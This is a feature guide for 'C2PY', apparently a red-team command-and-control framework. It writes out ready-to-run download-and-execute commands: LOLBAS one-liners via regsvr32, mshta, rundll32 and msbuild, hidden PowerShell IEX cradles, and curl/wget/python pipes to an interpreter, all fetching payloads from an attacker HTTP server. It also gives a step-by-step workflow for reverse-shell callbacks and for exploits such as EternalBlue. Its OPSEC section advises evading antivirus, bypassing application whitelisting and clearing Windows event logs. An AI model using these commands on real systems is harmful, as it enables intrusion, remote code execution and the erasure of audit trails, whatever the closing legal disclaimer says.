# C2PY Framework - NEW FEATURES GUIDE

## 🎯 Complete Integration Update

This update adds seamless integration between target system detection, payload generation, and reverse shell setup.

### ✨ New Features

#### 1. **Exploit Generator** 💥
Professional exploit database with ready-to-use commands for various vulnerabilities.

**Categories:**
- Windows Exploits (EternalBlue, BlueKeep, PrintNightmare, SMBGhost, ZeroLogon)
- Linux Exploits (Dirty COW, PwnKit, Sudo Baron Samedit)
- Web Application Exploits (SQLi, Command Injection, LFI, RFI, XXE, SSTI)
- Network Exploits (SMB Relay, IPv6 MITM)

**Features:**
- OS-based exploit suggestions
- Automatic command generation with your LHOST/LPORT
- Integration with Metasploit and manual exploitation
- Detailed requirements and payload type suggestions

**Usage:**
1. Open GUI: `python3 c2_gui.py`
2. Click "Generate Payload" button
3. Click 💥 (Exploit Generator) button
4. Select exploit category and specific exploit
5. Configure target IP, LHOST, LPORT
6. Generate command and copy or execute

#### 2. **LOLBAS Payload Support** 🔥
Living Off The Land Binaries for Windows - evade detection using built-in Windows tools.

**New Payload Categories:**
- RegSvr32 (SCT files)
- MSHTA (HTA files)
- Rundll32 (JavaScript/URL)
- MSBuild (XML projects)
- InstallUtil (.NET DLL)
- Certutil (Download & Execute)
- BITSAdmin (Background transfer)
- WScript/CScript (VBS files)

**Example LOLBAS Commands:**
```powershell
# RegSvr32
regsvr32.exe /s /n /u /i:http://192.168.1.21:8080/payload.sct scrobj.dll

# MSHTA
mshta.exe http://192.168.1.21:8080/payload.hta

# Rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.21:8080/payload.ps1')")

# MSBuild
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe http://192.168.1.21:8080/payload.xml
```

#### 3. **Payload Coordinator** 🎯
Automated attack setup with seamless integration of all components.

**Features:**
- Auto-detect target OS via TTL analysis
- Automatic payload suggestion based on target OS
- Auto-generate LOLBAS template files
- Integrated HTTP server management
- Complete attack plan generation

**Workflow:**
1. Enter target IP
2. Auto-detect or select target OS
3. Coordinator suggests best payload category
4. Generates all necessary files (SCT, HTA, VBS, XML, PS1)
5. One-click HTTP server start
6. One-click listener start
7. Copy-paste LOLBAS command on target

#### 4. **Staged Payloads** 📥
Download-and-execute payloads for reduced initial footprint.

**PowerShell Downloaders:**
```powershell
# IEX download
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.21:8080/payload.ps1')"

# Invoke-WebRequest
powershell.exe -NoP -NonI -W Hidden -Command "IWR -Uri http://192.168.1.21:8080/payload.ps1 -UseBasicParsing | IEX"
```

**Bash Downloaders:**
```bash
# Curl + bash
curl -s http://192.168.1.21:8080/payload.sh | bash

# Wget + bash
wget -qO- http://192.168.1.21:8080/payload.sh | bash

# Python downloader
python3 -c "import urllib.request;exec(urllib.request.urlopen('http://192.168.1.21:8080/payload.py').read())"
```

### 🚀 Quick Start Guide

#### Complete Attack Workflow

**Step 1: Start the C2 GUI**
```bash
python3 c2_gui.py
```

**Step 2: Open Attack Coordinator**
1. Click "Generate Payload" button in main window
2. Click 🎯 (Attack Coordinator) button
3. Enter target IP (e.g., 192.168.1.100)
4. Click "🔍 Auto-Detect OS" or select manually
5. Configure LHOST, LPORT, HTTP port
6. Enable "Use LOLBAS Techniques"
7. Click "🔨 Generate Attack Plan"

**Step 3: Start Services**
1. Click "🌐 Start HTTP Server" - serves LOLBAS templates
2. Click "🚀 Start Listener" - starts your C2 listener

**Step 4: Execute on Target**
Copy one of the generated LOLBAS commands and execute on target:
```powershell
# On Windows target:
regsvr32.exe /s /n /u /i:http://YOUR_IP:8080/payload.sct scrobj.dll
```

**Step 5: Receive Connection**
Agent connects back to your listener automatically!

### 📋 GUI Button Reference

In the Payload Generator dialog:

| Button | Description |
|--------|-------------|
| 🔄 | Generate/Refresh payload |
| 📋 | Copy payload to clipboard |
| 🎧 | Copy listener command |
| 💾 | Save payload to file |
| 🛡️ | Generate EXE agent |
| ⚡ | Generate compiled agent |
| 🔥 | LOLBAS payload generator |
| 🚀 | Start C2PY listener |
| 🌐 | Start/Stop HTTP server |
| 🎯 | **Attack Coordinator** (NEW!) |
| 💥 | **Exploit Generator** (NEW!) |

### 🔧 Advanced Features

#### Auto-Generated LOLBAS Templates

When you use Attack Coordinator, it automatically generates:

1. **payload.sct** - RegSvr32 scriptlet file
2. **payload.hta** - MSHTA HTML application
3. **payload.vbs** - VBScript for WScript/CScript
4. **payload.xml** - MSBuild project file
5. **payload.ps1** - PowerShell reverse shell

All files are pre-configured with your LHOST:LPORT!

#### HTTP Server Management

The integrated HTTP server:
- Serves files from `lolbas_templates/` directory
- Automatically sets correct MIME types
- Adds CORS headers for cross-origin requests
- Logs all file requests with colors

#### Target OS Detection

TTL-based OS detection:
- TTL ≤ 64 → Linux/Unix (High confidence)
- TTL ≤ 128 → Windows (High confidence)
- TTL ≤ 255 → Network Device (Medium confidence)

### 🎯 Exploit Generator Usage

#### Example: EternalBlue Exploit

1. Open Exploit Generator (💥 button)
2. Select "Windows Exploits" category
3. Select "EternalBlue (MS17-010)"
4. Configure:
   - Target IP: 192.168.1.100
   - LHOST: 192.168.1.50
   - LPORT: 4444
5. Click "🔨 Generate Exploit Command"
6. Copy command or execute in terminal

#### Example: PrintNightmare

1. Select "PrintNightmare (CVE-2021-1675)"
2. Configure target, LHOST, LPORT
3. Add optional: Username, Password, Domain
4. Generate command for Impacket or Metasploit

#### OS-Based Suggestions

1. Enter OS Type: "Windows"
2. Enter Version: "10"
3. Click "💡 Suggest Exploits"
4. See all applicable exploits for Windows 10

### 🛡️ OPSEC Considerations

**LOLBAS Advantages:**
- ✅ Uses legitimate Windows binaries
- ✅ Bypasses application whitelisting
- ✅ Less likely to trigger AV
- ✅ No malicious files on disk (initially)
- ✅ Blends with normal Windows activity

**Best Practices:**
1. Use HTTPS when possible (not HTTP)
2. Obfuscate PowerShell commands
3. Clear Windows Event Logs after activity
4. Use short-lived HTTP servers
5. Rotate LHOST/LPORT between operations

### 🔍 Troubleshooting

#### HTTP Server Won't Start
```bash
# Check if port is in use
netstat -tuln | grep 8080

# Try different port
# In Attack Coordinator, change HTTP Server Port to 8081
```

#### Target Can't Download Payload
```powershell
# On target, test connectivity:
Test-NetConnection -ComputerName YOUR_IP -Port 8080

# Check Windows Firewall:
Get-NetFirewallProfile | Select Name, Enabled

# Try alternative download method:
Invoke-WebRequest -Uri http://YOUR_IP:8080/payload.ps1 -UseBasicParsing
```

#### LOLBAS Command Fails
```powershell
# Some LOLBAS techniques may be blocked by AV
# Try alternatives:

# If RegSvr32 blocked, try MSHTA:
mshta.exe http://YOUR_IP:8080/payload.hta

# If MSHTA blocked, try PowerShell:
powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP:8080/payload.ps1')"
```

### 📚 Additional Resources

- LOLBAS Project: https://lolbas-project.github.io/
- GTFOBins (Linux): https://gtfobins.github.io/
- Exploit Database: https://www.exploit-db.com/

### ⚠️ Legal Disclaimer

**IMPORTANT:** This framework is for authorized security testing only!

- Only use on systems you own or have explicit permission to test
- Unauthorized access to computer systems is illegal
- Always follow responsible disclosure practices
- Respect privacy and data protection laws

### 🎉 Summary

The new integration provides:

1. **Complete Attack Automation** - From OS detection to payload delivery
2. **LOLBAS Support** - Stealthy execution using Windows built-ins
3. **Exploit Database** - Ready-to-use commands for common vulnerabilities
4. **Seamless Workflow** - HTTP server + Listener + Templates all managed together
5. **Professional UI** - Intuitive buttons and dialogs for all features

**Everything you need for a complete Red Team engagement in one framework!**

---

*Last Updated: February 2026*
*Version: 2.0 - Complete Integration Release*
